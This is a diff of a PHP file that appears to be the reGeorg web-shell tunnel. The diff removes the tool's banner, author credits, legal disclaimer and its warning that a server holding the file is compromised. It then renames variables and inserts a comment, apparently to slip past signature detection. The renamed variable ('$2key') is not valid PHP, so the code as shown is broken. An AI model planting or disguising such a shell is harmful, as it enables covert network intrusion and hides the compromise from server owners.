@@ -1,29 +1,5 @@
 <?php
-/*                   _____
-   ____   ______  __|___  |__  ______  _____  _____   ______
- |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
- |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
- |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
-                    |_____|
-                    ... every office needs a tool like Georg
 
-  willem@sensepost.com / @_w_m__
-  sam@sensepost.com / @trowalts
-  etienne@sensepost.com / @kamp_staaldraad
-
-Legal Disclaimer
-Usage of reGeorg for attacking networks without consent
-can be considered as illegal activity. The authors of
-reGeorg assume no liability or responsibility for any
-misuse or damage caused by this program.
-
-If you find reGeorge on one of your servers you should
-consider the server compromised and likely further compromise
-to exist within your internal network.
-
-For more information, see:
-https://github.com/sensepost/reGeorg
-*/
 
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
@@ -33,10 +9,10 @@ if( !function_exists('apache_request_headers') ) {
     function apache_request_headers() {
         $arh = array();
         $rx_http = '/\AHTTP_/';
-
-        foreach($_SERVER as $key => $val) {
-            if( preg_match($rx_http, $key) ) {
-                $arh_key = preg_replace($rx_http, '', $key);
+	/*  hello! */
+        foreach($_SERVER as $2key => $val) {
+            if( preg_match($rx_http, $2key) ) {
+                $arh_key = preg_replace($rx_http, '', $2key);
                 $rx_matches = array();
                 $rx_matches = explode('_', $arh_key);
                 if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
